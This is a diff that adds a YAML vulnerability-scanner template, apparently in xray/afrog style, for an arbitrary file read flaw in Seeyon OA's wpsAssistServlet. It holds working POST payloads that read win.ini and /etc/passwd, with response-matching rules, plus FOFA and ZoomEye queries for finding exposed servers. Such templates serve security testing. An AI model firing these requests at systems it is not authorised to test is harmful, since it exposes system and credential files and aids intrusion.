@@ -1,0 +1,31 @@
+id: seeyon-wpsassistservlet-fileread
+
+info:
+  name: 致远OA wpsAssistServlet 任意文件读取漏洞
+  author: fgz
+  severity: high
+  verified: true
+  description: |-
+    用友致远有A6和A8两大协同软件产品线：A6协同管理软件以其成熟稳定、“易用、好用、适用”的产品特性被业界誉为“协同经典”。2007年底发布的A8协同管理软件，以强力支持集团化、多语言和跨平台应用为特点，被业界誉为“中国协同应用软件的新标准”。致远互联-OA wpsAssistServlet接口存在任意文件读取漏洞容易造成敏感信息泄露。
+    FOFA: app="致远互联-OA" && title="V8.0SP2"
+    ZoomEye: app:"用友 致远OA"
+  reference:
+    - https://mp.weixin.qq.com/s/-bm9pSEb9CNADXtI6WjPIg
+  tags: seeyon,fileread
+  created: 2023/11/02
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /seeyon/wpsAssistServlet
+      body: flag=template&templateUrl=c:/windows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b"bit app support") && response.body.bcontains(b"fonts") && response.body.bcontains(b"extensions")
+  r1:
+    request:
+      method: POST
+      path: /seeyon/wpsAssistServlet
+      body: flag=template&templateUrl=/etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0() || r1()
+
